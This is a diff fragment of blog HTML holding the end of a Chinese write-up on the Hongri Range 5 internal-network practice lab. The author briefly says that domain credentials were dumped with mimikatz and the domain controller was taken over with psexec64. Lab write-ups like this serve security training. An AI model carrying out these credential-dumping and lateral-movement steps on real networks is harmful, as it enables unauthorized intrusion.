-<p>之前我们用猕猴桃抓到了域用户的账号密码，直接psexec64登录就可以了</p>
-<p><img src="/2023/02/11/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/image-20230211234524943.png" alt="image-20230211234524943"></p>
-<p>这里dc直接上线。内网靶场其实还是很好玩的。我还有很多需要学习的，加油！</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -698,7 +587,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">172</span>
+          <span class="site-state-item-count">173</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
